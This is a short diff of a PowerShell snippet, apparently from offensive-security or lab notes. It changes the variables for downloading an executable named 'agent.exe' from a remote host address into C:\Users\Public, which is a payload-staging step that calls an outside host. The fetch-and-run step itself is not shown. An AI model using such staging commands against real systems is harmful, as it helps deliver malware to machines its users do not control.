@@ -54,8 +54,8 @@ Add-Type $MyBusinessLogic
 
 ```powershell
 # Define variables
-$url = "http://192.168.2.228/agent.ps1"
-$exeName = "file.exe"
+$url = "http://10.10.14.2/agent.exe"
+$exeName = "agent.exe"
 $destPath = "C:\Users\Public"
 
 # Full path to save the downloaded file
